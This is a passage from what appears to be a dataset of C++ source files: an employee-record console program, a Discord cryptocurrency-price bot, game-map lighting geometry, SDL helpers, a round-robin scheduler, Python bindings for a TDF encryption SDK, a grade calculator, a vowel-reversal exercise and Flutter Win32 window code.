{\n        cout << \"Employee with ID \" << empId << \" not found.\"<< \"\\n---------------------\" << endl ;\n    }\n}\n\n// Function to print sack letter for employee\nvoid printSackLetter(const Employee& emp) {\n    cout << \"---------------------\\nDear \" << emp.name << \",\\n\";\n    cout << \"We regret to inform you that your employment with our company has been terminated.\\n\";\n    cout << \"Please collect your personal belongings and return any company property.\\n\";\n    cout << \"We wish you the best in your future endeavors.\\n\\n\";\n    cout << \"Sincerely,\\nManagement\\n---------------------\" << endl;\n}\n\n// Function to delete an employee\nvoid deleteEmployee(vector<Employee>& employees) {\n    int empId;\n    char choice;\n\n    cout << \"---------------------\\nEnter employee ID to delete: \";\n    cin >> empId;\n\n    bool found = false;\n    for (auto it = employees.begin(); it != employees.end(); ++it) {\n        if (it->id == empId) {\n            found = true;\n            cout << \"Do you want to generate a sack letter for employee \" << it->name << \"? (y/n): \";\n            cin >> choice;\n            if (choice == 'y' || choice == 'Y') {\n                printSackLetter(*it);\n            }\n            employees.erase(it);\n            cout << \"Employee with ID \" << empId << \" deleted successfully.\\n---------------------\" << endl;\n            break;\n        }\n    }\n    if (!found) {\n        cout << \"Employee with ID \" << empId << \" not found.\" << \"\\n---------------------\" << endl;\n    }\n}\n\nint main() {\n    vector<Employee> employees;\n    char choice;\n\n    do {\n        cout << \"\\nOptions:\\n1. Add new employee\\n2. Print all employees' info\\n3. Print employee salary by ID\\n4. Employee payout\\n5. Delete employee\\n6. Exit\\n\";\n        cout << \"Enter your choice: \";\n        cin >> choice;\n\n        switch (choice) {\n            case '1':\n                addEmployee(employees);\n                break;\n            case '2':\n                printAllEmployees(employees);\n                break;\n            case '3':\n                int empId;\n                cout << \"Enter employee ID to print salary: \";\n                cin >> empId;\n                printEmployeeSalary(employees, empId);\n                break;\n            case '4':\n                employeePayout(employees);\n                break;\n   ",
    "#include \"bot_mgr.h\"\n#include \"coin_mgr.h\"\n\ndpp::cluster bot(\"****************\");//replace with discord bot token\n\nbot_mgr::bot_mgr()\n{\n    bot.on_log(dpp::utility::cout_logger());\n    auto mgr = coin_mgr();\n    \n    /* The interaction create event is fired when someone issues your commands */\n    bot.on_interaction_create([this, &mgr](const dpp::interaction_create_t & event)\n    {\n        auto cmd_name = event.command.get_command_name();\n\n        if (!cmd_name.compare(\"gas\")) this->gas(event, mgr);\n\n        else \n        {\n            if (cmd_name == std::string(\"price\"))\n                cmd_name = std::get<std::string>(event.get_parameter(\"crypto\"));\n\n            std::transform(cmd_name.begin(), cmd_name.end(), cmd_name.begin(), toupper);\n            this->coin(event, cmd_name, mgr);\n        }\n    });\n \n    bot.on_ready([this, &mgr](const dpp::ready_t & event) {\n        if (dpp::run_once<struct register_bot_commands>())\n        {\n            const uint64_t time_to_tick = 300;\n\n            dpp::timer_callback_t callback = [&mgr](dpp::timer)\n            {\n                mgr.tick();\n            };\n\n            if (!setup)\n                bot.start_timer(callback, time_to_tick);\n\n            this->setup_cmds();\n        }\n    });\n\n    bot.start(false);\n}\n\nvoid bot_mgr::setup_cmds()\n{\n    if (!setup)\n    {\n        /* Create a new global command on ready event */\n        dpp::slashcommand btc(\"btc\", \"Get the current Bitcoin price\", bot.me.id);\n        dpp::slashcommand eth(\"eth\", \"Get the current Ethereum price\", bot.me.id);\n        dpp::slashcommand gas(\"gas\", \"Get the current Ethereum gas price\", bot.me.id);\n        dpp::slashcommand shib(\"shib\", \"Get the current Shiba Inu price\", bot.me.id);\n        dpp::slashcommand price(\"price\", \"Get the current price of a cryptocurrency\", bot.me.id);\n\n        price.add_option(dpp::command_option(dpp::co_string, \"crypto\", \"Cryptocurrency\", true));\n\n        /* Register the command */\n        //bot.global_command_create(btc);//Only need to register once\n        //bot.global_command_create(eth);\n        //bot.global_command_create(gas);\n        //bot.global_command_create(shib);\n        //bot.global_command_create(price);\n\n        setup = true;\n    }\n\n}\n\nvoid bot_mgr::gas(const dpp::interaction_create_t& e, coin_mgr& mgr)\n{   \n    auto eth_ticker = std::string(\"eth\");\n\n    if (!mgr.create_coin(eth_ticker)) \n        e.reply(\"Error getting gas\");\n\n    auto fee = mgr.get_fee(eth_ticker);\n    auto price = mgr.get_price(eth_ticker);\n\n    e.reply(fmt::format(std::locale(\"en_US.UTF-8\"), \"Low gas price = {} gwei = ${:.2Lf}\", fee, fee * 0.000021 * price));\n}\n\nvoid bot_mgr::coin(const dpp::interaction_create_t& e, const std::string& coin_ticker, coin_mgr& mgr)\n{\n    auto ticker_lower = coin_ticker;\n    std::transform(coin_ticker.begin(), coin_ticker.end(), ticker_lower.begin(), tolower);\n\n    auto coin_valid = mgr.create_coin(ticker_lower);\n    if (!coin_valid) e.reply(\"Coin is invalid\");\n\n    else\n    {\n        auto price = mgr.get_price(ticker_lower);\n        std::string fmt_string;\n        if (price < 0.1f)\n            fmt_string = fmt::format(std::locale(\"en_US.UTF-8\"), \"1 {} = ${:.9Lf}\", coin_ticker, price);\n        else\n            fmt_string = fmt::format(std::locale(\"en_US.UTF-8\"), \"1 {} = ${:.2Lf}\", coin_ticker, price);\n\n        e.reply(fmt_string);\n    }\n\n}\n",
    "#include \"qrad.h\"\n\n// =====================================================================================\n//  point_in_winding\n// =====================================================================================\nbool point_in_winding(const Winding &w, const dplane_t &plane, const vec_t *const point) {\n    unsigned numpoints = w.m_NumPoints;\n    int x;\n\n    for (x = 0; x < numpoints; x++) {\n        vec3_t A;\n        vec3_t B;\n        vec3_t normal;\n\n        VectorSubtract(w.m_Points[(x + 1) % numpoints], point, A);\n        VectorSubtract(w.m_Points[x], point, B);\n        CrossProduct(A, B, normal);\n        VectorNormalize(normal);\n\n        if (DotProduct(normal, plane.normal) < 0.0) {\n            return false;\n        }\n    }\n\n    return true;\n}\n\n// =====================================================================================\n//  point_in_wall\n// =====================================================================================\nbool point_in_wall(const lerpWall_t *wall, vec3_t point) {\n    int x;\n\n    // Liberal use of the magic number '4' for the hardcoded winding count\n    for (x = 0; x < 4; x++) {\n        vec3_t A;\n        vec3_t B;\n        vec3_t normal;\n\n        VectorSubtract(wall->vertex[x], wall->vertex[(x + 1) % 4], A);\n        VectorSubtract(wall->vertex[x], point, B);\n        CrossProduct(A, B, normal);\n        VectorNormalize(normal);\n\n        if (DotProduct(normal, wall->plane.normal) < 0.0) {\n            return false;\n        }\n    }\n    return true;\n}\n\n// =====================================================================================\n//  point_in_tri\n// =====================================================================================\nbool point_in_tri(const vec3_t point, const dplane_t *const plane, const vec3_t p1, const vec3_t p2, const vec3_t p3) {\n    vec3_t A;\n    vec3_t B;\n    vec3_t normal;\n\n    VectorSubtract(p1, p2, A);\n    VectorSubtract(p1, point, B);\n    CrossProduct(A, B, normal);\n    VectorNormalize(normal);\n\n    if (DotProduct(normal, plane->normal) < 0.0) {\n        return false;\n    }\n\n    VectorSubtract(p2, p3, A);\n    VectorSubtract(p2, point, B);\n    CrossProduct(A, B, normal);\n    VectorNormalize(normal);\n\n    if (DotProduct(normal, plane->normal) < 0.0) {\n        return false;\n    }\n\n    VectorSubtract(p3, p1, A);\n    VectorSubtract(p3, point, B);\n    CrossProduct(A, B, normal);\n    VectorNormalize(normal);\n\n    if (DotProduct(normal, plane->normal) < 0.0) {\n        return false;\n    }\n    return true;\n}\n\n// =====================================================================================\n//  intersect_line_plane\n//      returns true if line hits plane, and parameter 'point' is filled with where\n// =====================================================================================\nbool intersect_line_plane(const dplane_t *const plane, const vec_t *const p1, const vec_t *const p2, vec3_t point) {\n    vec3_t pop;\n    vec3_t line_vector;// normalized vector for the line;\n    vec3_t tmp;\n    vec3_t scaledDir;\n    vec_t partial;\n    vec_t total;\n    vec_t perc;\n\n    // Get a normalized vector for the ray\n    VectorSubtract(p1, p2, line_vector);\n    VectorNormalize(line_vector);\n\n    VectorScale(plane->normal, plane->dist, pop);\n    VectorSubtract(pop, p1, tmp);\n    partial = DotProduct(tmp, plane->normal);\n    total = DotProduct(line_vector, plane->normal);\n\n    if (total == 0.0) {\n        VectorClear(point);\n        return false;\n    }\n\n    perc = partial / total;\n    VectorScale(line_vector, perc, scaledDir);\n    VectorAdd(p1, scaledDir, point);\n    return true;\n}\n\n// =====================================================================================\n//  intersect_linesegment_plane\n//      returns true if line hits plane, and parameter 'point' is filled with where\n// =====================================================================================\nbool intersect_linesegment_plane(const dplane_t *const plane, const vec_t *const p1, const vec_t *const p2, vec3_t point) {\n    unsigned count = 0;\n\n    if (DotProduct(plane->normal, p1) <= plane->dist) {\n        count++;\n    }\n    if (DotProduct(plane->normal, p2) <= plane->dist) {\n        count++;\n    }\n\n    if (count == 1) {\n        return intersect_line_plane(plane, p1, p2, point);\n    } else {\n        return false;\n    }\n}\n\n// =====================================================================================\n//  plane_from_points\n// =====================================================================================\nvoid plane_from_points(const vec3_t p1, const vec3_t p2, const vec3_t p3, dplane_t *plane) {\n    vec3_t delta1;\n    vec3_t delta2;\n    vec3_t normal;\n\n    VectorSubtract(p3, p2, delta1);\n    VectorSubtract(p1, p2, delta2);\n    CrossProduct(delta1, delta2, normal);\n    VectorNormalize(normal);\n    plane->dist = DotProduct(normal, p1);\n    VectorCopy(normal, plane->normal);\n}\n\n// =====================================================================================\n//  TestSeg",
    "#include \"setup.h\"\r\n#include <bits/stdc++.h>\r\n\r\nusing namespace std;\r\n\r\nvoid quitSDL(SDL_Window* window, SDL_Renderer* renderer)\r\n{\r\n    SDL_DestroyRenderer(renderer);\r\n    SDL_DestroyWindow(window);\r\n    SDL_Quit();\r\n}\r\n\r\nbool checkCollision(SDL_Rect a, SDL_Rect b)\r\n{\r\n\r\n    int leftA, leftB;\r\n    int rightA, rightB;\r\n    int topA, topB;\r\n    int bottomA, bottomB;\r\n\r\n    leftA = a.x;\r\n    rightA = a.x + a.w;\r\n    topA = a.y;\r\n    bottomA = a.y + a.h;\r\n\r\n    leftB = b.x;\r\n    rightB = b.x + b.w;\r\n    topB = b.y;\r\n    bottomB = b.y + b.h;\r\n\r\n    if( bottomA <= topB )\r\n    {\r\n        return false;\r\n    }\r\n\r\n    if( topA >= bottomB )\r\n    {\r\n        return false;\r\n    }\r\n\r\n    if( rightA <= leftB )\r\n    {\r\n        return false;\r\n    }\r\n\r\n    if( leftA >= rightB )\r\n    {\r\n        return false;\r\n    }\r\n\r\n    return true;\r\n}\r\nbool check_click(SDL_Rect rect, int x, int y)\r\n{\r\n    return (x >= rect.x && y >= rect.y && x < rect.x + rect.w && y < rect.y +  rect.h);\r\n}\r\nint random(int a, int b)\r\n{\r\n    return rand() % (b-a+1) +a;\r\n}\r\n\r\n\r\n",
    "#include <iostream>\n\nusing namespace std;\n\nvoid queueUpdation(int queue[],int timer,int arrival[],int n, int maxProccessIndex) {\n\tint zeroIndex;\n\tfor(int i = 0; i < n; i++) {\n\t\tif(queue[i] == 0) {\n\t\t\tzeroIndex = i;\n\t\t\tbreak;\n\t\t}\n\t} \n\tqueue[zeroIndex] = maxProccessIndex + 1;\n}\n\nvoid queueMaintainence(int queue[], int n) {\n\tfor(int i = 0; (i < n-1) && (queue[i+1] != 0) ; i++){\n\t\tint temp = queue[i];\n\t\tqueue[i] = queue[i+1];\n\t\tqueue[i+1] = temp; \n\t}\n}\n\nvoid checkNewArrival(int timer, int arrival[], int n, int maxProccessIndex,int queue[]) {\n\tif(timer <= arrival[n-1]) {\n\tbool newArrival = false;\n\tfor(int j = (maxProccessIndex+1); j < n; j++) {\n\t\t\tif(arrival[j] <= timer){\n\t\t\tif(maxProccessIndex < j){\n\t\t\t\tmaxProccessIndex = j;\n\t\t\t\tnewArrival = true;\n\t\t\t}\n\t\t}\n\t}\n\t//adds the incoming process to the ready queue\n\t//(if any arrives)\n\tif(newArrival)\n\t\tqueueUpdation(queue,timer,arrival,n, maxProccessIndex);\n\t}\n}\n\n//Driver Code\nint main(){\n\tint n,tq, timer = 0, maxProccessIndex = 0;\n\tfloat avgWait = 0, avgTT = 0;\n\tcout << \"Enter the time slice/quantum: \";\n\tcin>>tq;\n\tcout << \"Enter the number of processes: \";\n\tcin>>n;\n\tint arrival[n], burst[n], wait[n], turn[n], queue[n], temp_burst[n];\n\tbool complete[n];\n\n\tcout << \"Enter the arrival time of the processes: \";\n\tfor(int i = 0; i < n; i++)\n\t\tcin>>arrival[i];\n\n\tcout << \"Enter the burst time of the processes: \";\n\tfor(int i = 0; i < n; i++){\n\t\tcin>>burst[i];\n\t\ttemp_burst[i] = burst[i];\n\t}\n\n\tfor(int i = 0; i < n; i++) { //Initializing the queue and complete array\n\t\tcomplete[i] = false;\n\t\tqueue[i] = 0;\n\t}\n\twhile(timer < arrival[0]) //Incrementing Timer until the first process arrives\n\t\ttimer++; \n\tqueue[0] = 1;\n\t\n\twhile(true) {\n\t\tbool flag = true;\n\t\tfor(int i = 0; i < n; i++) {\n\t\t\tif(temp_burst[i] != 0) {\n\t\t\t\tflag = false;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif(flag)\n\t\t\tbreak;\n\n\t\tfor(int i = 0; (i < n) && (queue[i] != 0); i++) {\n\t\t\tint ctr = 0;\n\t\t\twhile((ctr < tq) && (temp_burst[queue[0]-1] > 0)) {\n\t\t\t\ttemp_burst[queue[0]-1] -= 1;\n\t\t\t\ttimer += 1;\n\t\t\t\tctr++;\n\n\t\t\t\t//Checking and Updating the ready queue until all the processes arrive\n\t\t\t\tcheckNewArrival(timer, arrival, n, maxProccessIndex, queue);\n\t\t\t}\n\n\t\t\t//If a process is completed then store its exit time\n\t\t\t//and mark it as completed\n\n\t\t\tif((temp_burst[queue[0]-1] == 0) && (complete[queue[0]-1] == false)) {\n\t\t\t\t//turn array currently stores the completion time\n\t\t\t\tturn[queue[0]-1] = timer;\t \n\t\t\t\tcomplete[queue[0]-1] = true;\n\t\t\t}\n\t\t\t\n\t\t\t//checks whether or not CPU is idle\n\t\t\tbool idle = true;\n\t\t\tif(queue[n-1] == 0) {\n\t\t\t\tfor(int i = 0; i < n && queue[i] != 0; i++) {\n\t\t\t\t\tif(complete[queue[i]-1] == false) {\n\t\t\t\t\t\tidle = false;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\telse\n\t\t\t\tidle = false;\n\n\t\t\tif(idle) {\n\t\t\t\ttimer++;\n\t\t\t\tcheckNewArrival(timer, arrival, n, maxProccessIndex, queue);\n\t\t\t}\n\t\n\t\t\t//Maintaining the entries of processes \n\t\t\t//after each premption in the ready Queue\n\t\t\tqueueMaintainence(queue,n);\n\t\t}\n\t}\n\n\tfor(int i = 0; i < n; i++){\n\t\tturn[i] = turn[i] - arrival[i];\n\t\twait[i] = turn[i] - burst[i];\n\t}\n\n\tcout << \"\\nProgram No.\\tArrival Time\\tBurst Time\\tWait Time\\tTurnAround Time\" << endl;\n\tfor(int i = 0; i < n; i++){\n\t\tcout<<i+1 << \"\\t\\t\" << arrival[i] << \"\\t\\t\" << burst[i] << \"\\t\\t\" << wait[i] << \"\\t\\t\" << turn[i] << endl;\n\t}\n\tfor(int i =0; i< n; i++){\n\t\tavgWait += wait[i];\n\t\tavgTT += turn[i]; \n\t}\n\tcout<<\"\\nAverage wait time: \" << (avgWait/n)\n\t<<\"\\nAverage Turn Around Time: \" << (avgTT/n);\n\n\treturn 0;\n\t\n}\n",
    "//\n//  TDF SDK\n//\n//  Created by Sujan Reddy on 2019/03/04.\n//  Copyright 2019 Virtru Corporation\n//\n\n#include <pybind11/pybind11.h>\n#include <pybind11/stl.h>\n#include <sstream>\n\n#include <nanotdf_client.h>\n#include <nanotdf_dataset_client.h>\n#include <tdf_client.h>\n#include <tdf_assertion.h>\n#include <oidc_credentials.h>\n#include <version.h>\n\n#define STRINGIFY(x) #x\nusing namespace pybind11::literals;\n\nPYBIND11_MODULE(opentdf, tdf) {\n\n    using namespace virtru;\n    namespace py = pybind11;\n\n    tdf.doc() = \"Python bindings for the TDF SDK library\";\n\n    // Use the version number from VERSION\n    tdf.attr(\"__version__\") = opentdf_VERSION;\n\n    py::enum_<LogLevel>(tdf, \"LogLevel\")\n        .value(\"Trace\", LogLevel::Trace)\n        .value(\"Debug\", LogLevel::Debug)\n        .value(\"Info\", LogLevel::Info)\n        .value(\"Warn\", LogLevel::Warn)\n        .value(\"Error\", LogLevel::Error)\n        .value(\"Fatal\", LogLevel::Fatal);\n\n    py::enum_<AssertionType>(tdf, \"AssertionType\")\n        .value(\"Handling\", AssertionType::Handling)\n        .value(\"Base\", AssertionType::Base);\n\n    py::enum_<EncryptionState>(tdf, \"EncryptionState\")\n        .value(\"Enable\", EncryptionState::Enable)\n        .value(\"Disable\", EncryptionState::Disable);    \n\n    py::enum_<Scope>(tdf, \"Scope\")\n        .value(\"TDO\", Scope::TDO)\n        .value(\"PAYL\", Scope::PAYL)\n        .value(\"EXPLICIT\", Scope::EXPLICIT)\n        .value(\"Unknown\", Scope::Unknown);\n\n    py::enum_<AppliesToState>(tdf, \"AppliesToState\")\n        .value(\"encrypted\", AppliesToState::encrypted)\n        .value(\"unencrypted\", AppliesToState::unencrypted)\n        .value(\"Unknown\", AppliesToState::Unknown);\n\n    py::enum_<StatementType>(tdf, \"StatementType\")\n        .value(\"ReferenceStatement\", StatementType::ReferenceStatement)\n        .value(\"StructuredStatement\", StatementType::StructuredStatement)\n        .value(\"StringStatement\", StatementType::StringStatement)\n        .value(\"Base64BinaryStatement\", StatementType::Base64BinaryStatement)\n        .value(\"XMLBase64\", StatementType::XMLBase64)\n        .value(\"HandlingStatement\", StatementType::HandlingStatement)\n        .value(\"String\", StatementType::String)\n        .value(\"Unknow\", StatementType::Unknown);\n\n\n    py::class_<StatementGroup>(tdf, \"StatementGroup\")\n        .def(py::init([](StatementType statementType) { \n                return new StatementGroup(statementType);}), R\"pbdoc(\n              Create an statement group\n        )pbdoc\")\n        .def(\"set_statement_type\", &StatementGroup::setStatementType,\n                py::arg(\"statement_type\"), R\"pbdoc(\n                Set the statement type for the statement group\n\n            Args:\n                statement_type(StatementType): The Statement type\n        )pbdoc\")\n        .def(\"set_filename\", &StatementGroup::setFilename,\n                py::arg(\"filename\"), R\"pbdoc(\n                Set the filename for the statement group\n\n            Args:\n                filename(String): The filename\n        )pbdoc\")\n        .def(\"set_media_type\", &StatementGroup::setMediaType,\n                py::arg(\"media_type\"), R\"pbdoc(\n                Set the media type for the statement group\n\n            Args:\n                media_type(String): Media type\n        )pbdoc\")\n        .def(\"set_uri\", &StatementGroup::setUri,\n                py::arg(\"uri\"), R\"pbdoc(\n                Set the uri for the statement group\n\n            Args:\n                uri(String): uri\n        )pbdoc\")\n        .def(\"set_value\", &StatementGroup::setValue,\n                py::arg(\"value\"), R\"pbdoc(\n                Set the value for the statement group\n\n            Args:\n                value(String): Value for the statement group\n        )pbdoc\")\n        .def(\"set_is_encrypted\", &StatementGroup::setIsEncrypted,\n                py::arg(\"is_encrypted\"), R\"pbdoc(\n                Set value for the isEncrypted flag for the statement group\n\n            Args:\n                is_encrypted(bool): is encrypted flag\n        )pbdoc\");\n\n\n    py::class_<Assertion>(tdf, \"Assertion\")\n        .def(py::init([](AssertionType type, Scope scope) { \n                return new Assertion(type, scope);}), R\"pbdoc(\n              Create a default assertion\n\n            Args:\n                type(AssertionType): Assertion type, Handling or Base\n                scope(Scope): Scope of the assertion  \n        )pbdoc\")\n        .def(\"set_id\", &Assertion::setId,\n                py::arg(\"id\"), R\"pbdoc(\n                Set the id for the assertion\n\n            Args:\n                id(String): The assertion id\n        )pbdoc\")\n        .def(\"set_type\", &Assertion::setType,\n                py::arg(\"type\"), R\"pbdoc(\n                Return the type of the assertion\n\n            Args:\n                type(String): The type of the assetion\n        )pbdoc\")\n        .def(\"set_statement_group\", &Assertion::setStatementGroup,\n                py::arg(\"statement_group\"), R\"pbdoc(\n                Set the statement group for the assertion\n\n            Args:\n         ",
    "#include <iostream>\r\n#include <string>\r\nusing namespace std;\r\n\r\nint main() {\r\n    // Deklarasi variabel\r\n    string nama_siswa;\r\n    float nilai_keaktifan, nilai_tugas, nilai_ujian;\r\n    float nilai_murni_keaktifan, nilai_murni_tugas, nilai_murni_ujian;\r\n    float nilai_akhir;\r\n\r\n    // Masukkan data siswa\r\n    cout << \"Masukkan nama siswa: \";\r\n    getline(cin, nama_siswa);\r\n\r\n    cout << \"Masukkan nilai keaktifan: \";\r\n    cin >> nilai_keaktifan;\r\n\r\n    cout << \"Masukkan nilai tugas: \";\r\n    cin >> nilai_tugas;\r\n\r\n    cout << \"Masukkan nilai ujian: \";\r\n    cin >> nilai_ujian;\r\n\r\n    // Hitung nilai murni\r\n    nilai_murni_keaktifan = nilai_keaktifan * 0.2;\r\n    nilai_murni_tugas = nilai_tugas * 0.5;\r\n    nilai_murni_ujian = nilai_ujian * 0.3;\r\n\r\n    // Hitung nilai akhir\r\n    nilai_akhir = nilai_murni_keaktifan + nilai_murni_tugas + nilai_murni_ujian;\r\n\r\n    // Tampilkan nama siswa dan nilai akhir\r\n    cout << \"Nama siswa: \" << nama_siswa << endl;\r\n    cout << \"Nilai akhir: \" << nilai_akhir << endl;\r\n\r\n    return 0;\r\n}\r\n",
    "/*\n\n345. Reverse vowls of a string\n\n\nGiven a string s, reverse only all the vowels in the string and return it.\n\nThe vowels are 'a', 'e', 'i', 'o', and 'u', and they can appear in both lower and upper cases, more than once.\n\n\nSteps to this solution.\n\n1. Create a string that holds all vowels\n2. Create a string that holds the values of s (possibly optional)\n3.The goal is to achieve this solution by assigning two pointers which are\nat the first and last position and check for vowels, and while both pointers are sitting\ninside of a vowel then swap them, else just keep advancing \nwe want to stop when the two pointers cross each other and return the string array\n\n\nThe key method used in this solution is the std::string method .find()\n\n.find() scans thru a substring and looks for the first occurence of the char and returns the \nindex location\n\n.find() is all we need to solve this solution \n\n*/\n\n#include <iostream>\n#include <string>\n\n\n\n\nclass Solution {\n\nprivate:\n\t//We can create a member variable to represent the string array that holds \n\t//all the vowels (upper and lowercase) that we will check with .find\n\t//member variables should be private\n\tstd::string vowels = { \"aeiouAEIOU\" };\n\t\n\n\npublic:\n\t\n\tstd::string reverseVowels(std::string &s);\n\t\n};\n\n\nstd::string Solution::reverseVowels(std::string &s) {\n\n\t//We will be using the vowel string to check for occurences and index location within string s\n\n\t//We want to create a while loop that continously cycles thru the string swapping the vowels\n\t//We use a while loop rather than a for loop because we do not know how many iterations is\n\t//needed for completion \n\t//we know the operation is complete when the first pointer and the last pointer cross\n\t//so that will be the basis of our while loop\n\t//We have to initialize first and last \n\t//first is going to be the first location, last is going to be the last location within stirng s\n\t//we can find the last location within string s by using the string method .length() - 1, \n\t//We use - 1 since indexes start a 0\n\tint first = 0;\n\tint last = s.length() - 1;\n\tchar temp;\n\t\n\t\n\n\twhile (first < last) {\n\n\t\t//While inside of the while loop, we want to check each element that first and last are on\n\t\t//to see if they are vowels, if they are not vowels then move forward,\n\t\t//However if they are vowels, then we want to wait there until the other pointer has landed on a vowel as well\n\t\t//we want to use a while loop because we want this to be continous until the two pointers cross\n\t\t//So while first is less than last and after doing vowel.find() receiving no hits within (-1) we can\n\t\t//safely enter the while loop advancing the pointer\n\t\t//We need two while loops, one for the first pointer and one for the second pointer\n\t\t//NPOS = -1\n\t\twhile (first < last && vowels.find(s[first]) == std::string::npos) {\n\t\t\tfirst++;\n\t\t}\n\t\twhile (first < last && vowels.find(s[last]) == std::string::npos) {\n\t\t\tlast--;\n\t\t}\n\n\t\t//At this point within this method, first and last are both on a vowel,\n\t\t//This is true because they kept advancing every occurence that was not within \n\t\t//Our string vowel\n\t\t//Now we have to swap the values of first and last within the string\n\t\t//going to make a temp variable to swap\n\n\t\ttemp = s[first];\n\t\ts[first] = s[last];\n\t\ts[last] = temp;\n\n\t\t//Now we have to increment first and decrement last to continue forward after the operation\n\t\tfirst++;\n\t\tlast--;\n\n\n\t}\n\n\t//After the while loop is done, the vowels will be reversed return the string\n\n\treturn s;\n\n}\n\n\nint main() {\n\n\tSolution solution;\n\n\tstd::string sS = \"hEllo\";\n\tstd::string s = \"AEIOUaeiou\";\n\n\tstd::cout << solution.reverseVowels(sS);\n\n\n\t//Time Complexity O(n)\n\t//Spacae Complexity O(n)\n\n\treturn 0;\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
